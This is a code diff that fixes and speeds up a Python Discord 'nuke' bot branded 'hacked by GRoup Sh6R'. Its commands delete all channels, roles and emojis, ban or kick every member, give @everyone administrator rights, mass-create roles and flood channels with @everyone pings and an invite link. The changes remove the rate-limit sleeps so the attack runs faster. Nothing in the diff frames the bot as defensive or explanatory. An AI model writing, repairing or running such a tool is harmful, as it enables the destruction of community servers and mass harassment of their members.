@@ -38,8 +38,8 @@ async def on_ready():
     print("\n👨‍💻 Developer: 3zF")
     print("✅ Bot Ready\n")
 
-@bot.command()
-async def 1(ctx):
+@bot.command(name='1')
+async def create_channels(ctx):
     await ctx.message.delete()
     
     def check(m):
@@ -58,25 +58,29 @@ async def 1(ctx):
         spam_msg = await bot.wait_for('message', timeout=30, check=check)
         spam = spam_msg.content
         
+        created = 0
         for i in range(count):
             try:
                 channel = await ctx.guild.create_text_channel(f"{name}{i+1}")
                 print(f"✅ Created: {channel.name}")
+                created += 1
                 
                 if spam.lower() != 'none':
                     for j in range(50):
-                        await channel.send(spam)
-                        print(f"💬 Spammed: {channel.name} ({j+1}/50)")
-            except:
-                print(f"❌ Failed to create channel")
-            await asyncio.sleep(0.5)
+                        try:
+                            await channel.send(spam)
+                        except:
+                            pass
+                    print(f"💬 Spammed: {channel.name}")
+            except Exception as e:
+                print(f"❌ Failed: {e}")
             
-        await ctx.author.send(f"✅ **Done! Created {count} channels: {name}**")
-    except Exception as e:
-        await ctx.author.send(f"❌ Error: {str(e)}")
+        await ctx.author.send(f"✅ **Done! Created {created} channels: {name}**")
+    except:
+        await ctx.author.send("❌ **Timed out or error**")
 
-@bot.command()
-async def 2(ctx):
+@bot.command(name='2')
+async def delete_channels(ctx):
     await ctx.message.delete()
     count = 0
     for channel in ctx.guild.channels:
@@ -85,12 +89,11 @@ async def 2(ctx):
             count += 1
             print(f"🗑️ Deleted: {channel.name} ({count})")
         except:
-            print(f"❌ Failed: {channel.name}")
-        await asyncio.sleep(0.3)
+            pass
     await ctx.send(f"🗑️ **Deleted {count} channels**")
 
-@bot.command()
-async def 3(ctx):
+@bot.command(name='3')
+async def delete_roles(ctx):
     await ctx.message.delete()
     count = 0
     for role in ctx.guild.roles:
@@ -100,19 +103,18 @@ async def 3(ctx):
                 count += 1
                 print(f"🗑️ Deleted: {role.name} ({count})")
             except:
-                print(f"❌ Failed: {role.name}")
-            await asyncio.sleep(0.2)
+                pass
     await ctx.send(f"🗑️ **Deleted {count} roles**")
 
-@bot.command()
-async def 4(ctx):
+@bot.command(name='4')
+async def ban_all(ctx):
     await ctx.message.delete()
     
     def check(m):
         return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
     
     try:
-        await ctx.author.send("⚠️ **Are you sure you want to ban ALL members? (yes/no)**")
+        await ctx.author.send("⚠️ **Confirm ban all? (yes/no)**")
         confirm = await bot.wait_for('message', timeout=30, check=check)
         
         if confirm.content.lower() != 'yes':
@@ -127,21 +129,20 @@ async def 4(ctx):
                     count += 1
                     print(f"🔨 Banned: {member.name} ({count})")
                 except:
-                    print(f"❌ Failed: {member.name}")
-                await asyncio.sleep(0.3)
+                    pass
         await ctx.send(f"🔨 **Banned {count} members**")
     except:
-        await ctx.author.send("❌ Timed out")
+        await ctx.author.send("❌ **Timed out**")
 
-@bot.command()
-async def 5(ctx):
+@bot.command(name='5')
+async def kick_all(ctx):
     await ctx.message.delete()
     
     def check(m):
         return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
     
     try:
-        await ctx.author.send("⚠️ **Are you sure you want to kick ALL members? (yes/no)**")
+        await ctx.author.send("⚠️ **Confirm kick all? (yes/no)**")
         confirm = await bot.wait_for('message', timeout=30, check=check)
         
         if confirm.content.lower() != 'yes':
@@ -156,14 +157,13 @@ async def 5(ctx):
                     count += 1
                     print(f"👢 Kicked: {member.name} ({count})")
                 except:
-                    print(f"❌ Failed: {member.name}")
-                await asyncio.sleep(0.3)
+                    pass
         await ctx.send(f"👢 **Kicked {count} members**")
     except:
-        await ctx.author.send("❌ Timed out")
+        await ctx.author.send("❌ **Timed out**")
 
-@bot.command()
-async def 6(ctx):
+@bot.command(name='6')
+async def spam_channels(ctx):
     await ctx.message.delete()
     
     def check(m):
@@ -178,19 +178,21 @@ async def 6(ctx):
         for channel in ctx.guild.channels:
             try:
                 for i in range(50):
-                    await channel.send(message)
-                    print(f"💬 Spammed: {channel.name} ({i+1}/50)")
+                    try:
+                        await channel.send(message)
+                    except:
+                        pass
                 count += 1
+                print(f"💬 Spammed: {channel.name}")
             except:
-                print(f"❌ Failed: {channel.name}")
-            await asyncio.sleep(0.5)
+                pass
             
-        await ctx.author.send(f"✅ **Spammed {count} channels with: {message}**")
+        await ctx.author.send(f"✅ **Spammed {count} channels**")
     except:
-        await ctx.author.send("❌ Timed out")
+        await ctx.author.send("❌ **Timed out**")
 
-@bot.command()
-async def 7(ctx):
+@bot.command(name='7')
+async def change_name(ctx):
     await ctx.message.delete()
     
     def check(m):
@@ -205,10 +207,10 @@ async def 7(ctx):
         print(f"📝 Name changed: {new_name}")
         await ctx.send(f"📝 **Server name: {new_name}**")
     except:
-        await ctx.author.send("❌ Timed out or failed")
+        await ctx.author.send("❌ **Timed out**")
 
-@bot.command()
-async def 8(ctx):
+@bot.command(name='8')
+async def give_admin(ctx):
     await ctx.message.delete()
     
     def check(m):
@@ -224,13 +226,13 @@ async def 8(ctx):
             
         role = ctx.guild.default_role
         await role.edit(permissions=discord.Permissions.all())
-        print("👑 Admin given to @everyone")
+        print("👑 Admin given")
         await ctx.send("👑 **@everyone now has Admin!**")
     except:
-        await ctx.author.send("❌ Timed out or failed")
+        await ctx.author.send("❌ **Timed out**")
 
-@bot.command()
-async def 9(ctx):
+@bot.command(name='9')
+async def help_command(ctx):
     help_text = """
 ╔══════════════════════════════════════╗
 ║        ⚡ COMMANDS                  ║
@@ -264,7 +266,7 @@ async def ban(ctx):
                 await member.ban()
                 print(f"{member.name} was banned")
             except:
-                print(f"Failed to ban {member.name}")
+                pass
 
 @bot.command()
 async def admin(ctx):
@@ -274,7 +276,7 @@ async def admin(ctx):
         await role.edit(permissions=discord.Permissions.all())
         print("@everyone now has admin")
     except:
-        print("Failed to give @everyone admin")
+        pass
 
 @bot.command()
 async def roles(ctx):
@@ -282,9 +284,9 @@ async def roles(ctx):
     for i in range(250):
         try:
             await ctx.guild.create_role(name="hacked by GRoup Sh6R")
-            print("Role created")
+            print(f"Role created {i+1}")
         except:
-            print("Failed to create role")
+            pass
 
 @bot.command()
 async def Sh6R(ctx):
@@ -299,16 +301,19 @@ async def Sh6R(ctx):
             await channel.delete()
             print(f"{channel.name} deleted")
         except:
-            print(f"Failed to delete {channel.name}")
+            pass
     
     for i in range(50):
         try:
             channel = await ctx.guild.create_text_channel("hacker-by-GRoupSh6R")
             for j in range(100):
-                await channel.send("@everyone @here https://discord.gg/whZQG97vj")
-                print(f"{channel.name} spammed")
+                try:
+                    await channel.send("@everyone @here https://discord.gg/whZQG97vj")
+                except:
+                    pass
+            print(f"{channel.name} created and spammed")
         except:
-            print("Failed to create channel")
+            pass
 
 @bot.command()
 async def kick(ctx):
@@ -318,7 +323,7 @@ async def kick(ctx):
             await member.kick()
             print(f"{member.name} was kicked")
         except:
-            print(f"Failed to kick {member.name}")
+            pass
 
 @bot.command()
 async def emojidel(ctx):
@@ -328,17 +333,18 @@ async def emojidel(ctx):
             await emoji.delete()
             print(f"{emoji.name} deleted")
         except:
-            print(f"Failed to delete {emoji.name}")
+            pass
 
 @bot.command()
 async def name(ctx):
     await ctx.message.delete()
     new_name = ' '.join(ctx.message.content.split()[1:])
-    try:
-        await ctx.guild.edit(name=new_name)
-        print(f"Server name changed: {new_name}")
-    except:
-        print("Failed to change server name")
+    if new_name:
+        try:
+            await ctx.guild.edit(name=new_name)
+            print(f"Server name changed: {new_name}")
+        except:
+            pass
 
 @bot.command()
 async def prune(ctx):
